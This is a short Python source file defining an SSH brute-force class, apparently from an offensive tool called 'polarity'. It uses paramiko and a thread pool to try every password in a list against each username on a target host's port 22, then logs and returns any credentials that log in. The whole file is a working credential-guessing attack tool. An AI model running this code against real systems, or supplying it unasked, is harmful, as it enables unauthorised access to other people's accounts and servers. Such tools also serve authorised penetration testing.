import logging
import multiprocessing
from multiprocessing.dummy import Pool as ThreadPool

from paramiko import AutoAddPolicy
from paramiko import SSHException
from paramiko.client import SSHClient

from polarity.bruteforce.base import BaseBruteforce


class SSHBruteforce(BaseBruteforce):

    PORT = 22

    def __init__(self, host, users, passwords):
        super().__init__(host, users, passwords)

        logging.getLogger("paramiko").setLevel(logging.CRITICAL)

        self._current_user = None

    def start_bruteforce(self):
        logging.info("Starting SSH bruteforce against host %s",
                     self._host.ip_address)

        user_passwords = {}

        for user in self._users:
            self._current_user = user

            pool = ThreadPool(multiprocessing.cpu_count())
            results = pool.map(self.__check_password, self._passwords)

            results = list(filter(None, results))
            if results:
                password = results[0]

                logging.info("Password found: [%s] - %s", user, password)

                user_passwords[user] = password

        return user_passwords

    def __check_password(self, password):
        try:
            client = SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(AutoAddPolicy())

            client.connect(self._host.ip_address, self.PORT,
                           self._current_user, password, timeout=2)
            client.close()

            return password
        except SSHException:
            return None
